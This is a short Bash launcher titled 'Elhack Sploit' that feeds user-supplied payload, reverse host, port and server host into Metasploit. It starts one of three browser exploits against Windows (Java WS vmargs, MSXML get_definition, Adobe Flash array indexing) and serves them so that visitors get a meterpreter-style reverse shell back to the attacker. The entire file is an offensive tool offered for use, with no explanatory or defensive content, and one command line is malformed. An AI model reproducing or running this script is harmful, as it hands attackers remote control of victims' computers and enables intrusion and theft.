#!/bin/bash
clear
echo "##########################
      ### Elhack Sploit      ###
      ### code :Hamza.elhack ###
      ### fb:fb.me/elhack.dz ###
      ##########################
"
read -p "Enter payload you can use meterpreter here : " pay
read -p "Enter your HOST For reverse : " ip
read -p "Enter the PORT For Listening : " port
read -p "Enter SRVHOST : " srv


echo "
     1.Java WS Vmargs Exploit
     2.MSXML GET definition 2012
     3.adobeFlash array indexing exploit
     4.Return back to the main menu.
     5.Exit
"
read elhack

if [[ $elhack == 1 ]]; then
msfconsole -x "use exploit/windows/browser/java_ws_vmargs; set PAYLOAD $pay; set SRVHOST $srv; set SRVPORT 80; set URIPATH /; set LPORT $port; set LHOST $ip; exploit "
clear
./elhack.sh
elif [[ $elhack == 2 ]]; then
msfconsole -x "use exploit/windows/browser/msxml_get_definition_code_exec; set PAYLOAD $pay; set SRVHOST $srv; set SRVPORT 8080; set URIPATH /; set LPORT $port; set LHOST $ip; exploit"
clear
./elhack.sh
elif [[ $elhack == 3 ]]; then
msfconsole -x "use exploit/windows/browser/adobe_flashplayer_arrayindexing; set PAYLOAD $pay; set SRVHOST $srv; set SRVPORT 8080; set URIPATH /; set $; set LPORT $port; set LHOST $ip; exploit"

clear

./elhack.sh
elif [[ $elhack == 4 ]]; then

clear
./elhack.sh
elif [[ $elhack == 5 ]]; then
clear
exit

else
bash src/autpn.sh
fi

